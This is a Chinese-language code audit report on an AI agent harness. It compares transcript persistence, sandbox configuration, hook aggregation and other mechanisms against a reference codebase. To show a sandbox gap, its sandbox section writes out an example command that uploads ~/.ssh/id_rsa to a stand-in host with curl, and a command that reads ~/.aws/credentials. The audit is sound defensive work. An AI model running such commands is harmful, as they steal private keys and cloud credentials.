# 底座机制抽查对齐 cc-haha 差异清单(甲道)

> 📌 状态:🚧进行中 · 任务〈底座机制对齐审计〉· 本文是 `00-底座机制全图与审计分工.md` 四路审计中的「甲道」——范围自选已收窄(深读优先,非全覆盖),乙/丙/丁三路覆盖 00 文件里未被本文选中的模块。规格源 = `~/Desktop/cc-haha-ref` **当前源码**(不采信 `docs/plans/TS-cc-haha-v0.4.5-内核迁移矩阵-2026-07-07.md` 里任何"已完成/✅"记录,凡引用均已亲自去源码复核)。

## 0. 抽了哪些模块、为什么

对照 16 模块清单(权限类已有专项审计,本文跳过/只扫边界),选了以下 7 个交叉关联最紧的模块深读,理由:

1. **工具执行循环与流式**(`ts/src/harness/loop.ts`)——一切行为的心脏,max_output_tokens 续写/steering/中断都在这。
2. **上下文压缩恢复落盘**(`ts/src/context/compaction.ts` + `ts/src/harness/loop.ts` 的 `maybeCompact`)——长会话不崩的生命线。
3. **Session transcript 重放/持久化**(`ts/src/memory/transcript.ts` + loop.ts 的 `saveTranscript`)——与①②强相关,审下来发现是本轮最大的坑,单独成条。
4. **Hooks 事件系统**(`ts/src/hooks/hooks.ts`)——27 个事件全量声明,重点查多 hook 聚合优先级这种刁钻点。
5. **子代理与后台任务**(`ts/src/agents/agentTool.ts` + `ts/src/tasks/taskTools.ts`)——权限继承、fork resume、worktree isolation 这几个历史上出过回归的点。
6. **工作区沙箱路径护栏**(`ts/src/sandbox/*`)——migration 矩阵自称"OS 沙箱已默认开",必须亲自验证"开了之后到底管不管用"。
7. **Bash 路径与安全校验**(`ts/src/tools/dangerousCommand.ts` + `readCommandBoundary.ts`)——验证 P0 波"读命令路径边界"的真实覆盖面。

**未抽(留给其他窗口/乙丙丁路)**:权限模型/权限规则作用域/命令分类器与审批(专项审计范围)、Skills-Commands、MCP-Plugins、Provider-runtime-proxy(只顺手扫了一眼 fallback 机制,未深入)、前端低噪工具流。这些标"未核实",不代表已对齐。

**判级口径**(对齐 00 文件统一六档):真分叉 / 疑似 / 产品层故意 / 降级适配 / 我方缺失(cc 有我们没有)/ 我方多出(我们有 cc 没有,注明建议删/留)。

---

## 1. 【真分叉·高】Transcript 并非"逐轮落盘",而是"整个回合结束才落盘一次"——中途崩溃/kill/长任务会丢失本回合全部工具调用历史

**这是本轮最严重的发现,且已用可执行的最小复现脚本实证,不是代码走读猜测。**

### 迁移矩阵的原话(不采信,但先引用以说明分歧点)
`docs/plans/TS-cc-haha-v0.4.5-内核迁移矩阵-2026-07-07.md` §3.401 C 第 10 条:"✅transcript 逐轮落盘(loop.ts:377 循环体内每轮落盘,核实非缺口)"。

### 我方实际行为(file:line + 实测)
`ts/src/harness/loop.ts` 里 `saveTranscript()`(内部调 `opts.transcript.append(messages)`)的**全部**调用点只有 6 处:
- `loop.ts:347`、`loop.ts:359`(`applyStopHookContinuation` 内,goal-hook/blocking-feedback 分支)
- `loop.ts:562`、`loop.ts:599`(硬中断 abort 分支)
- `loop.ts:614`(max_output_tokens 续写注入后)
- `loop.ts:627`(steering 收件箱空、真正打算收尾前)

**主循环处理 tool_calls 的核心分支(`loop.ts:680-819`,每一轮工具批执行、`messages.push({role:'user', content: followup})` 之后)完全没有 `saveTranscript()` 调用**;`max_turns_reached` 分支(`loop.ts:822-825`)在 `return` 前也没有调。

用最小 fake model + fake transcript 实测两个场景(脚本见下方"我实际验证了什么",未改动任何项目文件,只在 scratchpad 里跑):

| 毒例 | 输入 | 我方行为(实测) | cc 应有行为(见下方 cc 证据) |
|---|---|---|---|
| A:模型永不收敛,命中 maxTurns=5 | 5 轮 tool_calls,从不吐 final | `append()` 调用次数 = **0**;`max_turns_reached` 返回前 transcript 文件对本回合完全空白 | cc `QueryEngine.ts` 每轮都会 `recordTranscript`,transcript 文件应已含至少若干轮的 tool_use/tool_result |
| B:正常收敛,5 轮 tool_calls 后第 6 步 final | 同上模型但第 6 步吐 final | `append()` 调用次数 = **1**,且发生在**第 6 次 model.step() 之后**(即整个回合结束后)—— 若在第 3~4 轮之间进程被 kill,transcript 里这次用户提问 + 全部 5 轮工具调用一条都不会落盘,即便工具已经真实执行(文件已改、命令已跑) | cc `QueryEngine.ts` 在 8+ 个不同时点调用 `recordTranscript`(见下),中途 kill 至少能保住已完成轮次 |

### cc 侧证据(两边对照,非猜测)
`~/Desktop/cc-haha-ref/src/QueryEngine.ts` 调用 `recordTranscript(...)` 的位置:第 454、631、734、750、752、802、856、945 行——即一次 `query()` 消费循环里,**每次有新消息产生就近乎立即落盘**,不是攒到回合结束才写一次。`recordTranscript` 定义见 `~/Desktop/cc-haha-ref/src/utils/sessionStorage.ts:1437`(按 uuid 去重、只 insert 新消息链)。

这印证了 cc 的架构本意:`query()`/`queryLoop` 生成器本身只管 yield 消息,**持久化职责被拆到外层 QueryEngine.ts,且密度是"近乎每条消息"**,不是"回合收尾"。我方把两层合并进 `runAgentLoop` 时,`saveTranscript()` 只补在几个特定分支(中断/续写/stop-hook),遗漏了"每轮工具批结束"这个 cc 实际会触发落盘的最高频时点。

### 影响面
- 后台任务(`ts/src/tasks/taskTools.ts`)的 `maxTurns` 常设置得比交互式对话更大(数十轮),长时间运行期间 sidecar 若被杀/崩溃/机器重启,整个任务的工具调用历史当场清零,resume 后模型对自己做过什么完全失忆(即使磁盘上的文件改动是真实存在的)。
- `max_turns_reached` 路径同理丢失。
- 与 CLAUDE.md 自己的存储哲学("文件式存储对齐 cc,JSONL 而非整块覆写"——本意就是为抗中断/可增量恢复)直接冲突:如果只在回合尾部整体写一次,选 JSONL 而非单个 JSON blob 的抗崩溃优势基本没用上。

### 掰回改法(供后续窗口用)
在 `loop.ts` 主循环处理完一批工具、`messages.push({role:'user', content: followup})`(`loop.ts:803`)之后立即加一次 `await saveTranscript()`(和已有的 `applyAggregateToolResultBudget()` 并列即可,同一位置);`max_turns_reached` return 前(`loop.ts:822-825`)也需要补一次。工作量:小(加 2 行 + 补/改现有测试断言 append 调用次数与时机),但要跑一遍全量 `loop.test.ts` 确认没有测试假设了"只在特定分支落盘"的旧行为。

---

## 2. 【真分叉·高,伴随一处降级适配已核实】OS 沙箱"默认开"时,网络与读取两个维度形同虚设——与 cc 真实沙箱语义有实质缩水

### 我方现状(file:line)
- `ts/src/server/index.ts:936`:`const sandboxEnabled = opts.sandboxEnabled ?? ((opts.env ?? process.env).QF_OS_SANDBOX !== '0')` —— **默认 true**(注释自称"owner 2026-07-09" 拍板默认开)。
- `ts/src/sandbox/osSandbox.ts:60-70` `buildRuntimeConfig()`:
  ```
  filesystem: { allowWrite: [...], denyWrite: [...], allowRead: [], denyRead: [] }
  network: { allowedDomains: [], deniedDomains: [] }
  ```
  函数自带注释直白承认:"读=默认全放;网络=空 allowedDomains(实际放行靠 initialize 的 askCallback=allow,W3 只做文件系统围栏,网络收紧交 W4)"。
- `ts/src/sandbox/osSandbox.ts:96`:`await SandboxManager.initialize(config, async () => true, false)` —— askCallback **恒为 true**,任何网络请求域名都无条件放行,不问、不拦、不记。

### cc 侧证据(对照)
`~/Desktop/cc-haha-ref/src/utils/sandbox/sandbox-adapter.ts`:
- Line 462:`getSandboxEnabledSetting()` 返回 `settings?.sandbox?.enabled ?? false` —— **cc 真实默认是关闭、opt-in**,用户须显式在 settings.json 写 `sandbox.enabled:true` 才生效(与我方"默认开"相反,这条本身判〔产品层故意〕——代码注释明确是 owner 已知情况下选择更严格的默认值,不算对齐缺陷)。
- `convertToSandboxRuntimeConfig()`(同文件 172-381 行)会从 `permissions.allow/deny` 里的 `WebFetch` 规则、`sandbox.network.allowedDomains`、`sandbox.filesystem.{allowRead,denyRead}` 真实组装网络域名白/黑名单与读路径限制——网络与读取在 cc 里是**一等公民维度**,不是留空。
- `initialize()`(同文件 730-792 行)的 `wrappedCallback` 会依据 `shouldAllowManagedSandboxDomainsOnly()` 策略真的拒绝/放行,不是硬编码 true。

### 毒例(同输入,两边行为对比)
| 输入 | cc(sandbox.enabled=true 时) | 我方(QF_OS_SANDBOX 默认未设 = 沙箱已开) |
|---|---|---|
| `curl http://evil.example --data-binary @~/.ssh/id_rsa`(OS 沙箱内执行) | 域名不在 allowedDomains 时,`sandbox-runtime` 层面即可按配置拒绝/触发 askCallback 决策 | OS 沙箱层 **无条件放行**(askCallback 恒 true);但需注明:我方 App 层命令风险分类器(`dangerousCommand.ts:4175`)把 `curl/wget/ssh/scp/...` 归类 `outreach`,default 权限档下仍会先弹审批卡——**这一层保护还在**,漏洞窗口具体是:①`bypassPermissions/acceptEdits/dontAsk` 档,或②审批通过一次后被脚本/依赖(而非顶层 shell 命令名)发起的二次网络调用(例如 `npm run build` 内部脚本偷偷 exfiltrate),这类"顶层命令看着正常、内部再发起网络请求"的场景,App 层分类器看不见,只能指望 OS 沙箱这层兜底——而这层目前是空的。 |
| `cat ~/.aws/credentials`(不在 workspace 内) | cc `denyRead`/`allowRead` 可配置直接在 OS 层拒绝 | OS 沙箱层同样无条件放行(`allowRead:[]/denyRead:[]`);但已核实 App 层有**独立**的读路径边界机制(`ts/src/tools/readCommandBoundary.ts` 的 `shellExternalReadNeedsApproval` + `dangerousCommand.ts` 的 `extractReadCommandPaths`),会把越界读从 `read` 升级到 `outreach` 需要审批——这条路径**基本补位**了 OS 层读取维度的缺口,不算完全无保护,但仍是两套不同层级机制,OS 层本身确实没做。 |

### 结论与判级
- "默认开"这个开关本身:**产品层故意**(代码注释显示是 owner 已知情况下的决定,比 cc 默认值更严格,不是疏漏)。
- "开了之后网络/读取维度是空的"这件事:**真分叉**——migration 矩阵用"✅OS 沙箱接线进生产入口默认开...smoke 证明写围栏真生效"的措辞,只验证了写围栏(fs write),没有提及网络与读取两个维度形同虚设,容易让人误以为"沙箱开了=网络也管住了"。这个语义缺口需要在文档/后续工作里明确标注,不能靠"沙箱已默认开"一句话带过。
- 掰回改法:`osSandbox.ts` 的 `buildRuntimeConfig` 至少应该把 `denyRead` 接上敏感目录默认黑名单(`~/.ssh`、`~/.aws` 等,可复用 `sandboxDenyWritePaths` 的思路建一个 `sandboxDenyReadPaths`);网络维度工作量较大(需要真实域名策略 + askCallback 决策逻辑),标注为"网络零拦截"是否要重新拍板,建议单独立项而非顺手改。工作量:读取维度小,网络维度中等偏大。

---

## 3. 【疑似·中】PreToolUse 多 hook 聚合:命中 deny 提前 return,会丢弃同一批次里排在后面的 hook 的 additionalContext/message

### 两边代码
- cc `~/Desktop/cc-haha-ref/src/utils/hooks.ts:2839-2900`:先跑**全部**匹配的 hook、收集每个的 result,再统一按 `deny > ask > allow` 优先级 reduce(`switch(result.permissionBehavior)`,全程不 break/return),同时无条件把每个 hook 的 `additionalContext`/`message`/`systemMessage` 都 yield 出去——不管最终决策是不是 deny。
- 我方 `ts/src/hooks/hooks.ts:410-419`(`applyPreToolUseHooks`):
  ```ts
  const decisions = await runHookEvent(registry, {...}, ctx)   // 已收集全部 hook 结果
  for (const decision of decisions) {
    if (decision.action === 'deny') return { input: nextInput, deniedMessage: decision.message, additionalContext }
    ...
  }
  ```
  `runHookEvent`(`hooks.ts:351-370`)确实会执行注册表里**全部**匹配的 hook(副作用都会发生),但 `applyPreToolUseHooks` 在消费这批结果时,一旦在数组里扫到某条 `deny`,立刻 `return`——**排在这条 deny 后面的 hook 若也返回了 `context`(比如一个纯审计/日志 hook),它的 additionalContext 不会被收进返回值**。

### 毒例
输入:同一个 PreToolUse 事件注册了两个 hook——hook A(排前)返回 `{action:'deny', message:'禁止'}`,hook B(排后,一个恒定触发的审计 hook)返回 `{action:'context', additionalContext:'已记录审计日志'}`。
- cc:两个 hook 都执行,最终决策 deny,但 B 的 `additionalContext`(审计日志文本)仍会被上抛给调用方(可能显示给用户或写进 trace)。
- 我方:B 的 handler **确实被调用**(副作用发生,比如日志真的写了),但 `applyPreToolUseHooks` 返回值里的 `additionalContext` 数组**不包含**B 那条(因为遍历到 A 的 deny 就提前 return 了),消费方(loop.ts:1197-1203)看不到这条 context,不会作为 `context_note` yield 出去。

### 影响
中等——只在"同一工具、同一事件真的注册了多个 hook,且其中一个 deny"这种较少见但完全合规的配置下才触发;不影响权限判定本身(deny 仍然生效),只是审计类/提示类 hook 的输出在这种情况下会被静默吞掉,用户看不到。

### 掰回改法
`applyPreToolUseHooks` 改成先把 `decisions` 全部遍历完、收集所有 `additionalContext`/askRequested/allowRequested,最后再单独判断有没有 deny 并决定要不要提前返回(deny 的 `additionalContext` 仍应该包含前面已收集的 context)。工作量:小,需要补一条多 hook 聚合的测试。

---

## 4. 【我方多出·低,建议保留但需标注】`detectStuck` 卡死检测是我方自造机制,cc 没有对应的机械计数器

### 核实过程
在 `~/Desktop/cc-haha-ref` 全仓搜索 `stuck`/`repeated`/`isLooping`/`loopDetect`/`sameTool` 等词,唯一相关命中是**系统提示词里的一句话指导**:`~/Desktop/cc-haha-ref/src/constants/prompts.ts:233`——"If an approach fails, diagnose why before switching tactics... Don't retry the identical action blindly... Escalate to the user with AskUserQuestion only when you're genuinely stuck"。这是纯文本提示,**没有任何机械计数/拦截代码**与之配套;cc 依赖模型自己读提示词自觉换招。

我方 `ts/src/harness/stuckDetector.ts` 是一套完整的机械检测:`CORE_SAME_CALL_LIMIT=4`、`MAX_TOTAL_TOOL_CALLS_NO_PROGRESS=40`,在 `loop.ts:795-802` 每批工具结果回灌前调用 `detectStuck()`,命中就注入一条 `<system-reminder>` 软提醒(非硬拦截,不影响工具真实执行)。

### 判级
我方多出,cc 无对应实现。因为是**软提醒**(不拒绝执行、只追加一条系统提醒文案),风险可控,建议**保留**——对国产模型(尤其小参数量模型更容易原地打转)是有价值的防御性增强,但应该在文档里明确标注"这是我方相对 cc 的增量能力,不是移植/对齐项",避免下次审计误以为它是"从 cc 移植但没测好"的半成品。

---

## 5. 【疑似·低,文档失真】迁移矩阵"待办清单"里若干条目实际已经做了,存在文档滞后

- `docs/plans/TS-cc-haha-v0.4.5-内核迁移矩阵-2026-07-07.md` §4 第 1 条大段待办里仍列着"worktree isolation"待补,但 `ts/src/agents/agentTool.ts:482-508` 已经有完整实现(`agentWorktree = effectiveIsolation === 'worktree'`,创建隔离 worktree、cleanup、进度事件全部齐活),且与 cc `~/Desktop/cc-haha-ref/src/tools/AgentTool/runAgent.ts` 的 `worktreePath` 透传逻辑方向一致。这条待办应该从清单里划掉。
- 这不是行为缺陷,只是文档没跟上代码(CLAUDE.md 自己的规则 8:"代码不会说谎,文档会过时"),顺手记录,建议后续 `/文档体检` 时清掉。

---

## 6. 【我方多出·需 owner 决策】"Remote Control / Swarm 桥接"大篇幅实现,与迁移矩阵自称的"out-of-scope"矛盾

### 证据
`docs/plans/TS-cc-haha-v0.4.5-内核迁移矩阵-2026-07-07.md` §3.401 明确写"out-of-scope(cc 有、本项目桌面/免登录/全本地定位不迁移):...SSH/swarm/PR 订阅/teleport/remote managed settings"。

但 `ts/src/tasks/` 下确实存在完整的 remote bridge 实现并**已接入** `ts/src/server/index.ts`:
- `bridgeRemoteState.ts`(667 行)、`bridgeWorkerClient.ts`(455 行)、`bridgeCodeSessionClient.ts`(157 行)、`bridgeRemoteTransport.ts`、`udsPeerRegistry.ts`(209 行)等,`ts/src/server/index.ts:77-83` 直接 import 并在 `index.ts:983/1076/1124/1201` 实例化使用。

### 核实是否真的会跑起来
`ts/src/tasks/bridgeRemoteTransport.ts:107-116` 的 `bridgeRemoteConfigFromEnv()`:未设置 `BRIDGE_REMOTE_BASE_URL`/`REMOTE_CONTROL_BASE_URL`/`ANTHROPIC_BASE_URL` 且没有对应 token 时返回 `null`——**默认桌面部署不会激活这套机制**,属于休眠代码,不是运行期风险。

### 判级与建议
不算"对齐 cc 的行为缺陷"(cc 有的东西我们也有部分实现,只是文档说不做),而是**文档与代码的范围声明矛盾**:要么这块工作量已经投入且打算保留(那应该更新"out-of-scope"清单,承认已在做),要么这是探索期遗留的死重(那应该评估是否删除以降低维护面——与"全本地免登录单用户"的产品定位有一定张力,毕竟这是一整套 remote/swarm 通信协议栈)。这是给 owner 的决策项,不是本审计能替你拍板的。

---

## 7. 【降级适配·已核实,非违规】模型失败切换走的是"整 provider 切换",不是 cc 的"同 provider 内换模型层级"

cc `~/Desktop/cc-haha-ref/src/query.ts:900-959`:`FallbackTriggeredError` 触发后在**同一次 query() 调用内**把 `currentModel` 换成 `fallbackModel`(例如换到另一档 Claude 模型)、tombstone 掉孤儿消息、剥离 thinking 签名后原地重试,这套机制深度绑定 Anthropic 自家的多模型分层(capybara→opus 之类)和 thinking block 签名机制。

我方 `ts/src/model/modelFactory.ts:58-70` 的 `createModelFromProviderCandidates` 走的是 `FallbackModel`(见 `ts/src/model/FallbackModel.ts`,未展开细读,标〔未核实〕细节)——在**多个完整配置好的 provider**(比如主用 MiMo、备用另一个网关)之间切换,发生在 `Model.step()` 这一层,loop.ts 完全无感知。

判级:**降级适配**,不算分叉——这是因为我方模型出口对接的是国产多供应商架构,没有 cc 那种"同一个 Anthropic 账号下的模型分层 + thinking 签名"场景,所以在 provider 层做 fallback 是合理的架构选择,不是把 cc 的机制漏做了。`FallbackModel.ts` 内部的冷却/健康检查/sticky 逻辑本次未深入验证,如果后续要审 Provider-runtime-proxy 模块,这是一个可以细化的起点。

---

## 8. 【已核实为"非缺口"】上下文压缩:cc 源码里大量高级机制(contextCollapse/reactiveCompact/cached-microcompact/time-based-microcompact)其实是 ant-only 或远程开关默认关闭,我方没做不算漏

这条专门记录下来是因为**乍看代码行数差距巨大**(cc `services/compact/*` 4359 行 vs 我方 `context/compaction.ts` 358 行),容易误判成"我方阉割严重",但深挖后证据指向相反结论:

- `~/Desktop/cc-haha-ref/src/services/compact/microCompact.ts:288-291` 原文注释:"Legacy microcompact path removed... For contexts where cached microcompact is not available (**external builds, non-ant users**, unsupported models, sub-agents), no compaction happens here"。
- `~/Desktop/cc-haha-ref/src/services/compact/cachedMicrocompact.ts:28`:`export const isCachedMicrocompactEnabled = stub` —— 字面上被替换成了桩函数(说明这部分内部实现在这份对外发布的参考源码里已被抽走)。
- `~/Desktop/cc-haha-ref/src/services/compact/timeBasedMCConfig.ts:30-34`:`TIME_BASED_MC_CONFIG_DEFAULTS.enabled = false`,且整个配置来自 GrowthBook 远程开关(`getFeatureValue_CACHED_MAY_BE_STALE('tengu_slate_heron', ...)`)——本地代码库控制不了这个值,默认值是关。
- `~/Desktop/cc-haha-ref/src/services/compact/autoCompact.ts:191-199` 注释直接写"REACTIVE_COMPACT is ant-only"。

也就是说,cc 面向**外部真实用户**的默认压缩行为,基本上就是我方已经实现的这套(`autoCompact` 阈值判定 + 单次 LLM 摘要 + 失败重试收缩),核心常量高度对齐:
- `AUTOCOMPACT_BUFFER_TOKENS=13_000`(cc `autoCompact.ts:62` vs 我方 `compaction.ts:14`,一致)
- `MAX_OUTPUT_TOKENS_FOR_SUMMARY=20_000`(cc `autoCompact.ts:30` vs 我方 `compaction.ts:13`,一致)
- `MAX_CONSECUTIVE_AUTOCOMPACT_FAILURES=3` ≈ 我方 `MAX_COMPACTION_FAILURES=3`(cc `autoCompact.ts:70` vs 我方 `compaction.ts:17`)
- `MAX_PTL_RETRIES=3`(cc `compact.ts:227`,未展开原文行号核实,标〔部分未核实:cc compact.ts 1737 行只读了摘要不是全文〕)≈ 我方 `MAX_COMPACT_SUMMARY_RETRIES=3`(`compaction.ts:23`)
- 9 段结构化摘要 prompt(cc `prompt.ts:68-76` 的 Primary Request/Key Technical Concepts/Files and Code/Errors and fixes/Problem Solving/All user messages/Pending Tasks/Current Work/Optional Next Step,九段)与我方 `compaction.ts:24-41` 的九段中文提示逐条对应,仅第 5 段措辞不同(cc "Problem Solving" vs 我方"已完成事项",内容意图接近,不算实质分叉)。

判级:**非缺口**——这是审计过程里"先怀疑、去两边源码验证、证伪自己最初的怀疑"的一个例子,写出来是为了给后续审计一个参照:别只看 cc 源码文件行数就断言我方阉割,要先查 `feature()`/GrowthBook 开关的默认值。

---

## 9. 顺手验证:Bash 读命令路径边界(P0 波声称已修)——核实为真对齐,非本次报告问题

`ts/src/tools/dangerousCommand.ts:4245`(`/^(rm|mv|cp|mkdir|rmdir|touch|chmod|chown|ln|tee)\b/... return 'file'`)确认:所有会写/改路径的命令(`rm/mv/cp/mkdir/touch` 等)在我方风险分类器里**恒为 `file` 或更高档**,不存在"越界的 mv/rm 因为不在 `extractReadCommandPaths` 的命令列表里就被当只读命令免审批放过"的漏洞——cc 的 `PATH_EXTRACTORS`(`~/Desktop/cc-haha-ref/src/tools/BashTool/pathValidation.ts:190`)之所以把 `cd/mkdir/touch/rm/rmdir/mv/cp/tr/awk` 也纳入路径抽取,是因为那个函数同时服务读**and**写边界判定;我方把"读边界升级"(`extractReadCommandPaths`/`readCommandBoundary.ts`)和"写/破坏性分类"(`classifyCommandRisk`)拆成了两套机制,但覆盖面等价——写类命令从不会被读边界的"免审批"逻辑误放行,因为它们从未被归类成 `read`。这是本次深读中**证伪了自己最初怀疑**的另一个案例,记录在案供交叉核对。

---

## 我实际验证了什么

**读过的关键文件(两边都读,非仅摘要)**:
- cc:`src/query.ts`(全文 1737 行读了 1-1450 行区间的核心循环体)、`src/query/deps.ts`、`src/services/compact/autoCompact.ts`(全文)、`src/services/compact/microCompact.ts`(全文)、`src/services/compact/timeBasedMCConfig.ts`(全文)、`src/services/compact/prompt.ts`(结构片段)、`src/utils/hooks.ts`(函数列表 + 2780-2900 行聚合逻辑)、`src/tools/AgentTool/runAgent.ts`(405-504 行权限继承)、`src/utils/sandbox/sandbox-adapter.ts`(全文 986 行)、`src/tools/BashTool/pathValidation.ts`(头部 + PATH_EXTRACTORS 附近)、`src/QueryEngine.ts`(recordTranscript 调用点)、`src/utils/sessionStorage.ts`(recordTranscript 定义)、`src/constants/prompts.ts`(stuck 相关文案)。
- 我方:`ts/src/harness/loop.ts`(全文 1425 行)、`ts/src/harness/stuckDetector.ts`(全文)、`ts/src/context/compaction.ts`(全文)、`ts/src/hooks/hooks.ts`(1-470 行)、`ts/src/permissions/canonical.ts`(全文)、`ts/src/agents/agentTool.ts`(worktree/permission 相关片段)、`ts/src/tasks/taskTools.ts`(747-836 行 fork resume)、`ts/src/sandbox/sandbox.ts`(全文)、`ts/src/sandbox/osSandbox.ts`(全文)、`ts/src/tools/readCommandBoundary.ts`(全文)、`ts/src/tools/dangerousCommand.ts`(extractReadCommandPaths/classifySegment 相关片段)、`ts/src/model/modelFactory.ts`(createModelFromProviderCandidates)、`ts/src/server/index.ts`(sandbox/bridge/transcript 相关片段)。

**跑过的命令(只读,未改任何项目文件)**:
- `cd ts && bun test` → **1697 pass / 0 fail**(168 文件,27.57s;一条 UDS 测试的预期 ECONNRESET 日志,非失败)。
- `cd ts && bun run typecheck` → 通过(`tsc --noEmit` + renderer tsconfig 均无输出即通过)。
- `cd ts && bun test src/harness/loop.test.ts src/context/compaction.test.ts src/hooks/hooks.test.ts src/tasks/taskTools.test.ts src/sandbox/sandbox.test.ts src/sandbox/osSandbox.test.ts` → 206 pass / 0 fail(本次重点模块的现有测试全绿,但绿灯不代表对齐——发现 1 的 bug 现有测试完全没覆盖到,这正是"测试绿≠行为对"的例子)。
- 在 scratchpad(`/private/tmp/claude-502/.../scratchpad/transcript-persist.test.ts`、`transcript-persist2.test.ts`,未写入项目仓库)里写了两个最小复现脚本,用 `bun test <绝对路径>` 跑出发现 1 的实证数据(`append() call count: 0` / `append() call count: 1 且发生在最后一步`)。
- `git log --oneline -30`、`git status --short` 确认审计过程未修改项目任何文件(仅新增了本报告 + 已有的临时 mcp 目录属于跑测试的副产物)。

**未核实(诚实列出,不装作看完)**:
- Provider-runtime-proxy 模块只顺手看了 `createModelFromProviderCandidates` 一处,`FallbackModel.ts`/`fetchRetry.ts` 内部的冷却/健康检查/sticky fallback 逻辑未展开对照 cc。
- Skills-Commands、MCP-Plugins、前端低噪工具流三个模块本轮完全未看,留给 00 文件里的乙/丙/丁路或后续窗口。
- cc `compact.ts`(1737 行)只读了摘要性质的 `prompt.ts`/`autoCompact.ts`,未逐行读完整 `compactConversation` 实现,`MAX_PTL_RETRIES` 具体行号未亲眼确认(是从其他文件的注释引用推断,已在正文标注)。
- Hooks 模块除 PreToolUse 聚合外,SessionEnd/ConfigChange/FileChanged/Elicitation 等 cc 独有的更细事件类型未逐个比对触发时机是否吻合(只确认了我方 27 个事件名全声明,未逐个核实 fire 位置的语义对齐度)。
